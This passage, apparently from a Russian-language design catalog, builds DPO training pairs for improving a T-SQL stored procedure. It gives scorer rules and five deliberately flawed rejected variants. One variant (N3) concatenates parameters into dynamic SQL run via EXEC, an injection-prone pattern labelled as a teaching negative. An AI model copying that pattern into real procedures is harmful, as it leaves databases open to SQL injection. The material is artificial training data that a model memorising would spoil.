  нет, но домен-нога остаётся платной. Финальный сплит = `LUBA_PRODUCT_DECISION_RESIDUAL` (кандидат PE-10). **[pass-time PE-8; SUPERSEDED FIX-RES-1 2026-07-14: задача 7 (SQL) → `RESOLVED_FROM_DOCUMENTED_AUTHORITY` (G4, `PersonalAdaptive` на двойном основании Paid+consent-DENY), остаётся non-blocking opt-in `paid-domain common leg`.]**

#### PE-8.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (якорь — живой синтетический SP-контракт генератора :317–:319): улучшить черновую T-SQL
процедуру чтения тоталов заказа `dbo.GetOrderTotals0`. `Y_best` — правдоподобный «работающий» черновик,
который возвращает данные, но нарушает пол-рубрики; `Y_goal` — процедура строго В КОНТРАКТНОЙ РАМКЕ (по
факту — форма, которую объявляет живой SP-контракт seed: identity, параметры, явный result set,
задекларированные side-effects, read-committed), БЕЗ выдуманных таблиц/параметров.

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON (учитель
Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ репозиторий и НЕ какую-либо
БД):**

```json
{
  "task": "Улучшить эту T-SQL хранимую процедуру платформенного отчёта (чтение тоталов заказа с задекларированным аудит-side-effect). Улучшай ПРОЦЕДУРУ строго в рамках объявленного контракта (identity, параметры, result set, задекларированные side-effects): параметризация без динамической конкатенации, явная форма результата, обработка ошибок, идемпотентный аудит. НЕ меняй контракт (имя процедуры и список параметров byte-exact), НЕ вводи параметров/таблиц/колонок сверх контракта, НЕ решай задач за пределами процедуры.",
  "target_unit": "stored-proc/generic-dotnet-sql-docs/dbo.GetOrderTotals0",
  "input_context": "identity: dbo.GetOrderTotals0; параметры (контракт .NET->SQL, byte-exact): @EntityId:uniqueidentifier <- entityId, @IncludeInactive:bit <- includeInactive (default 0) — ДРУГИХ параметров нет; result set (контракт DTO): Id, Name, Status, Total, UpdatedUtc; задекларированные side-effects: reads dbo.OrderTotals и dbo.OrderTotalsDetail (Total = SUM(Detail.Amount)), writes dbo.OrderTotalsAudit (аудит-контракт: не более 1 audit-строки на (EntityId, сутки UTC)) — ДРУГИХ write-целей нет; транзакционное поведение: read committed; .NET-вызыватели: OrderTotalsRepository0.LoadOrderTotals (CommandType.StoredProcedure, \"dbo.GetOrderTotals0\"), OrderTotalsService0.BuildOrderTotals",
  "current_best_output": "<Y_best-процедура — черновик, развёрнут в блоке ниже; в транспорте — JSON-escaped строка>",
  "requirements": [
    "parse-shape: валидный T-SQL, ровно один батч CREATE OR ALTER PROCEDURE; имя процедуры и список параметров byte-exact контракту (identity + I/O не менять; ни одного лишнего параметра — ось скорера sql_hallucinated_parameter)",
    "параметризация (security-ось sqlInjectionArbiter): только статический SQL с bound-параметрами; динамический SQL допустим ТОЛЬКО как sp_executesql с @-биндингами; конкатенация значений параметров в строку + EXEC запрещены",
    "явная форма результата: финальный SELECT с явным списком колонок ровно объявленного result set (Id, Name, Status, Total, UpdatedUtc); SELECT * запрещён — ось sql_missing_result_shape",
    "side-effects строго bounded: множество write-целей тела ⊆ {объявленный dbo.OrderTotalsAudit}; недекларированный INSERT/UPDATE/DELETE/DDL запрещён — ось missing_sql_side_effects; читаются только задекларированные dbo.OrderTotals+dbo.OrderTotalsDetail; чтение из необъявленного источника = потеря evidence (ось ORCH-02 Missing Evidence)",
    "error-handling/транзакционность: BEGIN TRY/BEGIN CATCH; write-путь в явной транзакции с ROLLBACK в CATCH; THROW пробрасывает исходную ошибку (не глотать); guard-валидация @EntityId IS NULL; read committed сохранён",
    "идемпотентность аудита: повторный вызов с теми же аргументами не плодит state сверх контракта (≤1 audit-строки на (EntityId, сутки UTC) — dedup-предикат, не unconditional INSERT)",
    "полнота деливери: процедура реально реализует контракт (не заглушка/TODO/SELECT 1) — ось PromptError-11 Vague Deliverables; SET NOCOUNT ON; каждый объявленный параметр реально используется в теле"
  ],
  "wrong_markers": [
    "sql_hallucinated_parameter", "missing_sql_side_effects", "sql_injection_unsafe_concat", "ORCH-02", "PromptError-11"
  ],
  "output_schema": {
    "goal_text": "string — улучшенная T-SQL процедура (Y_goal); один CREATE OR ALTER PROCEDURE батч, не скрипт БД и не миграция",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**`Y_best` (current_best_output, развёрнуто; правдоподобный черновик наивного генератора — работает, но
нарушает пол-рубрики; это НЕ инъекции негативов, а слабый черновик с несколькими слабостями, как `Y_best`
PE-4/PE-5/PE-8-образца):**

```sql
CREATE OR ALTER PROCEDURE dbo.GetOrderTotals0
    @EntityId uniqueidentifier,
    @IncludeInactive bit = 0
AS
BEGIN
    INSERT INTO dbo.OrderTotalsAudit (EntityId, ReadAtUtc, IncludeInactive)
    VALUES (@EntityId, GETUTCDATE(), @IncludeInactive);

    SELECT *
    FROM dbo.OrderTotals
    WHERE EntityId = @EntityId AND IsActive = 1;
END
```

Слабости `Y_best` (то, что учитель должен улучшить): нет `SET NOCOUNT ON`; нет guard-валидации
(`@EntityId = NULL` → тихий пустой результат + NULL-строка аудита); `SELECT *` — форма результата не
гарантирована (контракт DTO `Id, Name, Status, Total, UpdatedUtc` может молча разъехаться со схемой),
`Total` вообще не вычисляется (объявленное чтение `dbo.OrderTotalsDetail` отсутствует); `@IncludeInactive`
объявлен, но фильтр захардкожен `IsActive = 1` (контракт параметра сломан наполовину); аудит —
unconditional INSERT на каждый вызов (retry плодит строки: объявленный dedup-контракт нарушен) и вне
TRY-CATCH/транзакции (сбой аудита валит процедуру сырой ошибкой).

Бюджет (plan-09 :499; plan-08 §3.5.2 `num_ctx≈8192`): `max_input_tokens = num_ctx −
reserved_output_tokens`. Аппроксимация автора: task+criteria ≈ 900 ток.; input_context ≈ 600;
current_best_output ≈ 350; format ≈ 350; резерв ответа 1024 — итого ≈ 3200 ≪ 8192: unit-level (ОДНА
процедура, не скрипт БД), влезает без порезки (`trimmed=false`; фактический токен-счёт меряет токенайзер
при build, каталог его НЕ заявляет).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = `Y_goal`; одна процедура строго в контрактной
рамке):**

```sql
CREATE OR ALTER PROCEDURE dbo.GetOrderTotals0
    @EntityId uniqueidentifier,
    @IncludeInactive bit = 0
AS
BEGIN
    SET NOCOUNT ON;

    IF @EntityId IS NULL
    BEGIN
        THROW 50001, 'ENTITY_ID_REQUIRED: @EntityId must be provided.', 1;
    END;

    BEGIN TRY
        BEGIN TRANSACTION;

        INSERT INTO dbo.OrderTotalsAudit (EntityId, ReadAtUtc, IncludeInactive)
        SELECT @EntityId, SYSUTCDATETIME(), @IncludeInactive
        WHERE NOT EXISTS (SELECT 1
                          FROM dbo.OrderTotalsAudit
                          WHERE EntityId = @EntityId
                            AND CAST(ReadAtUtc AS date) = CAST(SYSUTCDATETIME() AS date));

        COMMIT TRANSACTION;
    END TRY
    BEGIN CATCH
        IF @@TRANCOUNT > 0 ROLLBACK TRANSACTION;
        THROW;
    END CATCH;

    SELECT o.Id,
           o.Name,
           o.Status,
           ISNULL(SUM(d.Amount), 0) AS Total,
           o.UpdatedUtc
    FROM dbo.OrderTotals AS o
    LEFT JOIN dbo.OrderTotalsDetail AS d ON d.OrderTotalsId = o.Id
    WHERE o.EntityId = @EntityId
      AND (@IncludeInactive = 1 OR o.IsActive = 1)
    GROUP BY o.Id, o.Name, o.Status, o.UpdatedUtc;
END
```

```json
{
  "improvements": [
    "guard-валидация first: @EntityId IS NULL отдаёт структурную ошибку THROW 50001 вместо тихого пустого результата и NULL-строки аудита",
    "явная форма результата: SELECT * заменён явным списком колонок контракта (Id, Name, Status, Total, UpdatedUtc); Total реально вычисляется из ЗАДЕКЛАРИРОВАННОГО чтения dbo.OrderTotalsDetail (SUM) — новых источников не введено",
    "контракт параметра восстановлен: @IncludeInactive реально управляет фильтром (@IncludeInactive = 1 OR o.IsActive = 1); ни одного параметра сверх контракта не добавлено",
    "идемпотентный аудит: unconditional INSERT заменён dedup-предикатом NOT EXISTS по объявленному контракту ≤1 строки на (EntityId, сутки UTC) — retry не плодит строк",
    "error-handling: аудит-запись в явной транзакции внутри TRY/CATCH с ROLLBACK и THROW — сбой не оставляет частичного состояния и не глотается",
    "SET NOCOUNT ON; статический параметризованный SQL сохранён (нет динамической конкатенации/EXEC); write-цели тела ⊆ {dbo.OrderTotalsAudit}"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (SP-ось — карта §3 строка 7: «синтаксис-валидность,
контракт вход/выход процедуры, идемпотентность/транзакционность»; чеклист покрытия = живая
SP-omission-семья :85–:93 + must_include-оси живого SP-промпта :66–:71; детерминированный eval-only судья;
пороги/веса — per-WO деталь, WO может только УЖЕСТОЧИТЬ):**
1. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax);
2. **parse-shape + identity/params byte-exact:** `goal_text` парсится как ровно один T-SQL батч
   `CREATE OR ALTER PROCEDURE` (парсер класса ScriptDom — [условно от M1]); identity == `dbo.GetOrderTotals0`
   (провал = живой класс `missing_stored_procedure_identity` :93); список параметров == контракту, ни
   одного лишнего (лишний параметр = `sql_hallucinated_parameter`, зеркало живого `missing_sql_parameters`
   :85);
3. **параметризация (security-ось `sqlInjectionArbiter`):** 0 вхождений `EXEC(<конкатенированная строка>)`;
   динамический SQL только `sp_executesql` с @-биндингами; детектор конкатенации @-параметров в строковые
   литералы (провал = `sql_injection_unsafe_concat`; рубрика `RAG-07` :449 «конкатенация/интерполяция
   user-input; „санитизация" как основная защита»);
4. **result-shape declared:** явный список колонок финального SELECT == объявленному result set;
   `SELECT *` → провал (живой класс `missing_sql_result_shape` :87: DTO-маппинг не выводим);
5. **side-effects bounded + evidence:** множество write-целей тела ⊆ {`dbo.OrderTotalsAudit`}
   (недекларированный INSERT/UPDATE/DELETE/DDL → провал `missing_sql_side_effects` :89); множество
   read-источников ⊆ {`dbo.OrderTotals`, `dbo.OrderTotalsDetail`} (чтение из необъявленного источника →
   провал `ORCH-02 Missing Evidence`: значение без citable-источника);
6. **error-handling present:** TRY/CATCH; write-путь в явной транзакции; `ROLLBACK` в CATCH; `THROW`
   пробрасывает исходную ошибку;
7. **идемпотентность аудита:** audit-INSERT несёт dedup-предикат (`NOT EXISTS`/`MERGE`-класс); unconditional
   `VALUES`-INSERT на каждый вызов → провал;
8. **полнота деливери:** тело реально реализует контракт (не `SELECT 1`/TODO/заглушка → провал
   `PromptError-11 Vague`); каждый объявленный параметр referenced в теле.
Судья — детерминированный eval-only (`Y_best`-selection determinism classification, SI_GATE_6); решение
гейта: `chosen = Y_goal ⇔ Score(Y_goal) > Score(Y_best)`, ничья → `Y_best` (acceptance-independence).

**(г) STUDENT-проекция (unit I/O обучаемой стороны):** SQL-юнит:
`InputContext{proc_contract (identity + параметры + result set + задекларированные side-effects +
вызыватели), y_best_sql}` → улучшенная процедура (текст). В паре: `InputContext` = контракт+черновик (БЕЗ
сырого промпта пользователя — анти-replay; БЕЗ connection string и имени реального сервера —
leakage/secret-оси), `Chosen` = принятая процедура, `Rejected` = дефектный вариант. Достижимость студентом
(≤3–4B / узкая специализация): единица — ОДНА короткая процедура в ЖЁСТКОЙ контрактной рамке с конечным
словарём паттернов (`SET NOCOUNT ON`, guard-`THROW`, `TRY-CATCH`-скелет, `NOT EXISTS`-дедуп, явный список
колонок) — структурный выход, не свободное эссе; до обучения SQL-ноги студент честно отдаёт `not_ready` —
путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD`.

#### PE-8.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошей процедурой (б): полный парсящийся правдоподобный T-SQL (НЕ
отказ, НЕ мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды: **пара
false-presence↔false-absence** (`sql_hallucinated_parameter` НОВЫЙ доменно-локальный ↔ `missing_sql_side_effects`
ЖИВОЙ канон :89–:90 без переименования) + 1 доменно-локальный security (`sql_injection_unsafe_concat`,
родитель `PromptError-02 No DNA Safety`) + 2 канонических кода карты (`ORCH-02 Missing Evidence` +
`PromptError-11 Vague Deliverables`).

**N1 — FALSE-PRESENCE (доменно-локальный `sql_hallucinated_parameter`).** В сигнатуру добавлен
незадекларированный параметр `@RegionCode nvarchar(10)` и он использован в `WHERE`; всё остальное без
изменений:
`… @IncludeInactive bit = 0, @RegionCode nvarchar(10) … WHERE o.EntityId = @EntityId AND o.RegionCode = @RegionCode AND (@IncludeInactive = 1 OR o.IsActive = 1) …`
`[WRONG: sql_hallucinated_parameter (доменно-локальный FALSE-PRESENCE; родитель PromptError-02 No DNA Safety; ЗЕРКАЛО живого класса missing_sql_parameters :85–:86, отсутствующее в живой таксономии генератора — как doc_hallucinated_claim в PE-6) — процедура ОБЪЯВЛЯЕТ вход @RegionCode, которого НЕТ в контракте (контракт: только @EntityId, @IncludeInactive): .NET-вызыватель OrderTotalsRepository0.LoadOrderTotals (CommandType.StoredProcedure) его никогда не передаёт → runtime «procedure expects parameter @RegionCode which was not supplied»; wiki-ответ «какие входы влияют на выход процедуры» становится ЛОЖЬЮ в утвердительную сторону — ровно false-presence, зеркальный контраст к N2]`

**N2 — FALSE-ABSENCE (ЖИВОЙ канон-код `missing_sql_side_effects`, :89–:90, переиспользован БЕЗ
переименования — FC-44 no-dual-canon).** После финального SELECT добавлена одна строка
`UPDATE dbo.OrderTotals SET Status = N'Viewed' WHERE EntityId = @EntityId;`; всё остальное без изменений:
`[WRONG: missing_sql_side_effects (ЖИВОЙ код missing_sql_*-таксономии — DocumentationGeneratorDpoGenerator.cs:89–:90; descriptive-имя задачи sql_omitted_side_effect мапится на этот живой канон, переименования НЕТ) — процедура с контрактом «reads + только задекларированный audit-append» втихую МУТИРУЕТ бизнес-таблицу dbo.OrderTotals: недекларированный state-changing write маскируется под safe lookup (живая формулировка класса: «marks a state-changing procedure as safe … persistence-risk hidden»); контракт side-effects МОЛЧИТ о реальном эффекте — ровно false-absence, зеркальный контраст к N1; повторное чтение меняет данные (read перестаёт быть идемпотентным), impact-анализ вызывателей теряет реальную зону записи]`

**N3 — SECURITY (доменно-локальный `sql_injection_unsafe_concat`; RAG-07 `sqlInjectionArbiter` = ОСЬ
СКОРЕРА, не код негатива).** Финальный статический SELECT заменён динамической конкатенацией с EXEC
(сигнатура и остальное тело без изменений):
`DECLARE @sql nvarchar(max) = N'SELECT o.Id, o.Name, o.Status, ISNULL(SUM(d.Amount),0) AS Total, o.UpdatedUtc FROM dbo.OrderTotals AS o LEFT JOIN dbo.OrderTotalsDetail AS d ON d.OrderTotalsId = o.Id WHERE o.EntityId = ''' + CAST(@EntityId AS nvarchar(50)) + N''' AND (' + CAST(@IncludeInactive AS nchar(1)) + N' = 1 OR o.IsActive = 1) GROUP BY o.Id, o.Name, o.Status, o.UpdatedUtc;'; EXEC (@sql);`
`[WRONG: sql_injection_unsafe_concat (доменно-локальный security; родитель PromptError-02 No DNA Safety; ОСЬ СКОРЕРА — канонический RAG-07 sqlInjectionArbiter, Tier-1 CWE-TOP25 + OWASP-ASVS) — значения параметров конкатенируются в динамическую строку и исполняются EXEC(@sql) вместо статического параметризованного запроса: типизированные uniqueidentifier/bit МАСКИРУЮТ риск (сегодня строка «работает», потому негатив правдоподобен), но паттерн — критический инъекционный класс: первое же строковое поле (имя/фильтр/сортировка) в этом же коде исполнит произвольный SQL вызывающего; дополнительно фрагментируется план-кэш и ownership-chaining прав процедуры утекает в динамический контекст]`

**N4 — ORCH-02 Missing Evidence (канонический код карты строк 5/6).** Финальный SELECT читает из
НЕЗАДЕКЛАРИРОВАННОГО источника `dbo.OrderArchive` (JOIN добавлен), которого нет в контракт-evidence; всё
остальное без изменений:
`… FROM dbo.OrderTotals AS o LEFT JOIN dbo.OrderTotalsDetail AS d ON … LEFT JOIN dbo.OrderArchive AS a ON a.OrderId = o.Id …, ISNULL(a.ArchivedTotal, 0) AS Total …`
`[WRONG: ORCH-02 Missing Evidence (канонический) — процедура выводит Total из источника dbo.OrderArchive, которого НЕТ в задекларированном контракт-evidence (объявлены только reads dbo.OrderTotals+dbo.OrderTotalsDetail): значение без citable-источника — граф/арбитр не может процитировать, откуда взялись данные; это ровно анти-паттерн живого контракта LINKED-SYSTEM-GRAPH-CONTRACT «graph must not invent a stored procedure link»/родня живого missing_evidence :83–:84 «produces text that cannot be cited or verified» — SP «изобретает» связь к неевиденцированному объекту]`

**N5 — PromptError-11 Vague Deliverables (канонический).** Тело «улучшенной» процедуры заменено вагусной
заглушкой (парсится, но контракт не реализует):
`AS BEGIN SET NOCOUNT ON; -- TODO: реализовать чтение тоталов и аудит по контракту SELECT 1 AS Result; END`
`[WRONG: PromptError-11 Vague Deliverables (канонический) — «улучшение» = вагусная заглушка SELECT 1 + TODO-комментарий вместо реализации контракта: result-shape (Id, Name, Status, Total, UpdatedUtc) не отдаётся, аудит-side-effect не выполняется, параметры не используются — деливери формально «есть» (батч парсится), но по сути пустой; вызыватель OrderTotalsService0.BuildOrderTotals получает нерабочий контракт]`

Гейты пары G1–G3, G5–G6: G1 — каждый N парсится и правдоподобен (типичные ошибки реальных генераторов/
джуниоров: «на всякий случай» лишний параметр, «удобный» статус-апдейт по месту, динамический SQL «для
гибкости», JOIN к «похожей» таблице, заглушка-TODO); G2 — код таксономии указан (доменно-локальный
FALSE-PRESENCE / живой `missing_sql_*` FALSE-ABSENCE / доменно-локальный security / 2 канонических +
родительская ось где применимо); G3 — `[WRONG:]` присутствует; G5 — не почти-копия по ДИФФ-региону
(доменный overlap-гейт PE-8.4; N1–N5 сконструированы с непересекающимися дифф-регионами:
param-add / trailing UPDATE / EXEC-блок / OrderArchive-JOIN / vague-body); G6 — классы типичны для домена:
инъекция — класс #1 SQL-security (CWE-TOP25), а контракт параметров/side-effects/identity/evidence — ровно
те оси, которые живой SP-промпт генератора объявляет must_include (:66–:71). Каждый N — ровно одна главная
ошибка; слабый негатив → отбраковка пары (предохранитель §1.3 п.6), НЕ обучение.

#### PE-8.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "stored-proc-pair-0001", "Level": "unit", "NodeOrEdgeId": "stored-proc/generic-dotnet-sql-docs/dbo.GetOrderTotals0",
  "InputContext": { "proc_contract": "identity dbo.GetOrderTotals0; @EntityId:uniqueidentifier <- entityId; @IncludeInactive:bit <- includeInactive (ДРУГИХ параметров нет); result set: Id, Name, Status, Total, UpdatedUtc; side-effects: reads dbo.OrderTotals+dbo.OrderTotalsDetail, writes dbo.OrderTotalsAudit (<=1 строка/(EntityId, сутки UTC)) (ДРУГИХ источников/целей нет); read committed; вызыватели: OrderTotalsRepository0.LoadOrderTotals, OrderTotalsService0.BuildOrderTotals",
                    "y_best_sql": "<черновик Y_best из PE-8.2>" },
  "Chosen":   { "sql_text": "<процедура (б): guard + идемпотентный аудит в TRY/CATCH-транзакции + явный result set + контракт параметров byte-exact + статический параметризованный SQL; read/write-цели ⊆ контракту>" },
  "Rejected": { "sql_text": "<N1: незадекларированный параметр @RegionCode в сигнатуре и WHERE (false-presence)>" },
  "WrongMarkers": ["[WRONG: sql_hallucinated_parameter — процедура объявляет @RegionCode, которого нет в контракте (@EntityId,@IncludeInactive) — false-presence входа, .NET-вызыватель его не передаёт]"],
  "Reason": "Процедуры платформенного слоя обязаны иметь byte-exact контракт входов: объявление параметра сверх контракта (@RegionCode) — false-presence, ломающая .NET->SQL вызов и wiki-ответ о входах; chosen держит контракт параметров ровно объявленным (>=24 символа Gate B)",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 :389–:409; заполняет детерминированный TeacherProvenanceAdapter (не LLM); teacher_output_used_for_training — по исходу гейта G-DPO-FINAL, до него false" },
  "SourceIds": ["llm-mvp-core-docgen-sql-synthetic-seed", "catalog-pe8-stored-proc-seed-0001"], "HeldOut": false, "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **`DpoTrainReady: false` [условно от M1 + G-DPO-FINAL] — ФЛИП против образца-Fable (`true`):** наш канон
  требует `false` до `G-DPO-FINAL` для ВСЕХ задач, иначе `dual-live-canon` статуса готовности (FC-44).
  У SQL-домена нет Phase-0-блока класса `TOKENIZER_BLOCKED` (T-SQL — латиница), НО `false` держат ТРИ
  независимых основания: (1) builder/scorer/T-SQL-парсер ScriptDom-класса/маршрут — [условно от M1]
  (кода НЕТ); (2) **REAL-SOURCE корпуса НЕТ:** counted-свип PE-8.1 = 0 реальных процедур в 5 доступных
  репо (образцовый `xiigen mvp` отсутствует, CITED-not-verified); real-corpus unlock = static `.sql` с
  процедурами в репо (default :955, сейчас 0) ИЛИ consent-gated извлечение из живой БД
  (`ISqlConsentGate` DENY :955); до unlock SP-code семья = `SYNTHETIC_SEED`-forward; (3) глобальный
  `G-DPO-FINAL` (overlay :48–:53). Это НЕ «маршрут заблокирован Phase-0», а «условная незрелость + source-
  кавета» — честный флип.
- **LegScope:** `PersonalAdaptive` (Paid=SQL, `RAG-02` :18 + consent-обострение PE-8.1); строки от реальных
  пользовательских БД → всегда `.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`); синтетический seed
  первопартийный, но продуктовый сплит держит SQL-способность в платной ноге.
- **Обе проекции (fan-out winner-vs-each-loser):** 5 негативов на один chosen → 5 ОТДЕЛЬНЫХ пар
  `stored-proc-pair-0001..0005` (по одной на N1..N5); поле `Rejected` НИКОГДА не несёт список (§1.4; владелец
  проекции — builder WO-M1.1). Chosen во всех 5 парах = процедура (б); Rejected меняется: 0001=N1
  (false-presence), 0002=N2 (false-absence), 0003=N3 (injection), 0004=N4 (ORCH-02), 0005=N5 (Vague).
- **Source-disjoint нота (`HeldOut`):** живой генератор УЖЕ несёт дизъюнктные семьи train/heldOut (10
  train-имён `OrderTotals..SurveyAnswers` vs 10 heldOut-имён `InvoiceAging..SessionCleanup`, :296–:297) —
  прямое живое подтверждение паттерна §1.3 п.9 в доменном коде; held-out кандидаты пары: heldOut-семья
  генератора + (после consent-extraction) реальные SP из ДРУГОЙ БД, чем train; лексический Jaccard-guard
  train↔eval обязателен.
- **Grounding-гейт + reward-scalarization:** стороны — СТРУКТУРЫ (SQL-код) → скаляризация ТОЛЬКО каноном
  блока 07: `reward(side)=Beta·(policyLogP−referenceLogP)`; `margin = chosenReward − rejectedReward`;
  `margin ≤ 0.05 → LOW_CONTRAST`, не учим (plan-07 :341–:360). Судейские скоры (parse-shape/params-exact/
  параметризация/result-shape/side-effects+evidence/идемпотентность/vagueness — PE-8.2(в), чеклист покрытия =
  живая SP-omission-семья :85–:93) → `preference_score`-provenance/`Y_best`-аудит, НЕ reward. GROUNDING как
  ПЕРВИЧНАЯ ось приёмки: каждый chosen обязан быть строго в контрактной рамке (0 hallucinated-входов, 0
  необъявленных источников/целей) — иначе кандидат вне argmax.
- **SQL-OVERLAP гейт (доменный перенос PE-4.4):** одно-дефектная инъекция в ~40-строчную процедуру даёт raw
  overlap ≫ 0.75 by construction — правило PE-4.4 переносится 1-в-1 с SQL-рамкой: `frame` = токены
  `InputContext` (CREATE PROCEDURE сигнатура + контракт схемы: имена процедуры/параметров/колонок/таблиц +
  `Y_best`-черновик); `shared=(chosen∩rejected)−frame; total=(chosen∪rejected)−frame; overlap_ratio=shared/total`;
  гейт ОДНОСТОРОННИЙ `>0.75 → discard`; нижней границы нет (малый материальный дифф легален); порог
  материальности: дифф-регион ≥ 1 семантический SQL-statement; keyword-case/whitespace/alias-rename-only
  дифф → discard (G5). **Кавета:** 0.75 — концептуальный порог (перенос PE-4.4), runtime-мерителя НЕТ
  [условно от M1]; N1–N5 сконструированы с непересекающимися дифф-регионами (param-add / trailing UPDATE /
  EXEC-блок / OrderArchive-JOIN / vague-body) — попарный overlap дифф-регионов ≈ 0 by construction;
  фактический `overlap_ratio` меряет builder, НЕ каталог.
- **Leakage-нота:** `ExcludedLeakageSignals` = полный канон §1.4 (все 6: `candidate_index`/`source_path`/
  `source_id`/`file_order`/`correlation_id`/`exact_prompt`; образец-Fable нёс 5, терял `source_id`, а вместо
  него нёс внеканонные `connection_string`/`database_server_name`). SQL-специфика: реальные connection
  strings/имена серверов в пары НЕ попадают ни одной стороной — но это правило secretPresence-карантина
  (PE-8.5 п.4), НЕ 7-й leakage-сигнал на канон-строке (15-е поле не добавляется, §1.4).
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** канонического распределения
  SQL-код классов нет ни в `RAG-07`, ни в `RAG-10` — честная нота; живой SP-DOC сосед даёт ЖИВОЙ ориентир
  узкой маршрутизации батчей (`identity-sideeffect-caller` 40/30/30, `sideeffect-only`, 50/50-миксы —
  :198–:223); ориентир-аналогия `RAG-10` §6.7: критический класс (`sql_injection_unsafe_concat`) ≈ 25%
  батча, негативов 60–70% от positive; ОБЯЗАТЕЛЬНОЕ доменное правило баланса форм: false-absence-негативы
  (N2, короче chosen) и false-presence-негативы (N1, длиннее chosen) смешиваются так, чтобы длина не
  коррелировала с меткой; точный баланс = обязанность DPO-build, НЕ каталога.

#### PE-8.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и в
   `rejected`-ИСТОЧНИКЕ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации. Доменная
   ОСТРОТА — живая: SQL-ветка генератора кладёт `[WRONG:]` ПРЯМО В ТЕКСТ rejected (:86–:93) и гейтит их
   наличие (`wrong_annotation_rate` :39) — при переиспользовании живых доменных пар builder ОБЯЗАН
   выполнить strip, иначе тренер выучит детекцию тега на первом же батче; это свойство существующего кода,
   не гипотеза.
2. **Acceptance-signal independence (plan-09 :504–:544; SI_GATE_6/SI_GATE_7):** `chosen` решает ТОЛЬКО
   детерминированный SQL-`IndependentDomainScorer` (parse-shape + params-exact + параметризация +
   result-shape + side-effects+evidence + идемпотентность + vagueness — PE-8.2(в)); `current_output_is_already_optimal`
   учителя — диагностика, скоринг исполняется ВСЕГДА; `acceptance_signal_source != teacher_self_report` И
   `!= trained_unit_self_confidence`. КОНКРЕТНАЯ живая ловушка (родня Confidence-ловушки PE-6/PE-7): живой
   `DocumentationGeneratorOutput.Confidence` (`ProjectWikiDomainModels.cs:1126`; вычисляется как
   `flags.Count/flags.Length` — `DocumentationGeneratorUnit.cs:43`) меряет ЗАПОЛНЕННОСТЬ полей, НЕ
   ПРАВДИВОСТЬ — SQL-код-скорер не смеет наследовать логику «все секции на месте = хорошо»: N1 (лишний
   параметр) и N4 (лишний JOIN) дают структурно «полный», парсящийся текст при сломанной семантике/контракте.
   `Y_best`-selection классифицирован как детерминированный eval-only baseline (SI_GATE_6), не скрытая
   trainable-власть.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + SQL-специфика):** (а) НЕ константный промпт — пары батча от
   ≥2 разных процедур/семей (живые train-имена `dbo.GetOrderTotals0` + `dbo.GetCampaignStats0`, :297);
   (б) **length-balance двусторонний, обе формы инстанцированы:** N1 (добавленный параметр), N3 (EXEC-блок),
   N4 (добавленный JOIN) чуть ДЛИННЕЕ chosen; N2 (добавленный UPDATE — короче полной рамки на отсутствие
   dedup?), N5 (заглушка) чуть КОРОЧЕ — батч из одной формы научит длину, не семантику → смешивание форм
   ОБЯЗАТЕЛЬНО (урок PE-7); (в) НЕ confidence-leakage — числовое поле `Confidence` в SQL-тексты сторон не
   попадает; (г) НЕ measurement circularity — рубрика скорера (в) не производная от train-строк
   (source-disjoint + Jaccard-guard); (д) `chosen==rejected` → хард-гейт; (е) mojibake-гейт — T-SQL
   латиница, но русские комментарии/строковые литералы под тем же гейтом (порча кириллицы в любой стороне
   пары = провал); **(ж) SQL-специфичные хаки:** НЕ форматирование-как-сигнал (chosen с идеальными
   отступами/UPPERCASE-ключевыми словами vs rejected lowercase/рваные отступы — запрещено; whitespace/
   keyword-case нормализация обеих сторон до токенизации — обязанность builder'а); НЕ single-token-shortcut
   (батч, где ЕДИНСТВЕННЫЙ разделитель chosen/rejected — присутствие `SET NOCOUNT ON` или токена `TRY`,
   научит детекцию токена, а не семантику — оси улучшений обязаны варьироваться по батчу).
4. **`PromptError-05 Deterministic Shortcut` — предохранитель СКОРЕРА (не класс негатива):** сам
   `IndependentDomainScorer` НЕ смеет быть скрытым детерминированным лукапом, выдающим себя за
   trainable-судью — он eval-only детерминированный арбитр ПО ДИЗАЙНУ и назван так честно; trainable-нога —
   это SQL-юнит-СТУДЕНТ (allowed-level `ILogicalUnit`), который должен НАУЧИТЬСЯ генерировать процедуру в
   контрактной рамке, а не скорер.
5. **Карантин-классы (§1.3 п.11 + SQL-обострение):** security — инъекционный паттерн N1(N3) существует в
   датасете ТОЛЬКО как rejected-teaching-negative (text-only, НЕ исполняется, НЕ деплоится, НЕ в
   migration-пути — учебный негатив, не реальная уязвимость к поставке); privacy — реальные SP/DDL ЧУЖИХ
   пользовательских БД → `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`); consent —
   сама возможность читать живую БД закрыта `ISqlConsentGate` default DENY (:955); secretPresence —
   connection strings/пароли/имена реальных серверов в любой стороне пары запрещены (синтетический seed их
   не содержит — counted: 0); легальный — закрытая проприетарная teacher-модель → `DATASET_REBUILD_REQUIRED`;
   лицензии рубрики: канонические ИМЕНА rubric свободны, но seed-СТРОКИ `sqlInjectionArbiter` питаются
